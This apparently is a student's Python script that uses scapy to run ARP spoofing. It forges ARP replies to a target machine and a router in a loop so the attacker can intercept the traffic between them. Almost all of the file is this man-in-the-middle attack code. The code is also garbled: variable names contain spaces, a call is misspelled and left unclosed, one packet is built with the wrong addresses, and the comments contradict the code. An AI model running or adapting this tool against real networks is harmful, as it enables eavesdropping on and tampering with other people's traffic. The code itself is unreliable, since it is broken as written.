# involves scapy which can be installed
# will involves manual and automated arp spoofing
# arp spoofing involves imitating the mac address of a machine to intercept
# packets
# import scapy
# 

# from scapy.all import *
# scapy commands:
# ls(ARP), ls(TCP), ls(UDP), ls(ETHER)
# scapy allows to read different kinds of packets
# packet = ARP(pdst='ipv4, etc...')
# will create malicious packets with manual arp spoofing
# manual construction of a broadcast packet to obtain MAC addresses of target 
# machines.
# broadcast = ether(dst='ff:ff:ff:ff:ff:ff')
-----------------------------------------------------------------------------
import scapy.all as scapy
import sys
import time

# will send mal packet to machine saying we are router and send mal to router
# saying we are machine and then forward the packets from one machine to 
# another and vice versa

# used to obtain ip address of router or target machine
def get_mac_address(ip_address):
    #broadcast message looking for Mac address of device using its ip address
    broadcast_layer = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_layer = scapy.ARP(pdst=ip_address)
    get_mac_packet = broadcast layer/arp layer
    answer = scapy.srp(get_mac_packet, timeout=2, verbose=False)[0]
    return answer[0][1].hwsrc

def spoof(router_ip, target_ip, router_mac, target_mac):
    #sending packet to target router and target machine to spoof both together
    packet1 = scapy.ARP(op=2, hwdst=router_mac, pdst=router_ip, psrc=target_ip)
    #packet1 is sent to target ip pretending to come from router
    packet2 = scapy.ARP(op=2, hwdst=target_mac, pdst=router_ip, psrc=router_ip)
    #packet2 is sent to router ip pretending to come from target
    scapy.send(packet1)
    scapy.send(packet2)

target_ip = sys.argv[2]
# reads target ip and router ip from cmd once user runs it
router_ip = stri(sys.argv[1]
# obtains mac address of target_ip and router_ip
target_mac = str(get_mac_address(target_ip))
router_mac = str(get_mac_address(router_ip))
# spoof function to use requested mac/ip info to mimic target machined
try:
    while True:
        spoof(router_ip, target_ip, router_mac, target_mac)
        time.sleep(2)

except KeyboardInterrupt:
    print('Closing ARP Spoofer.')
    exit(0)
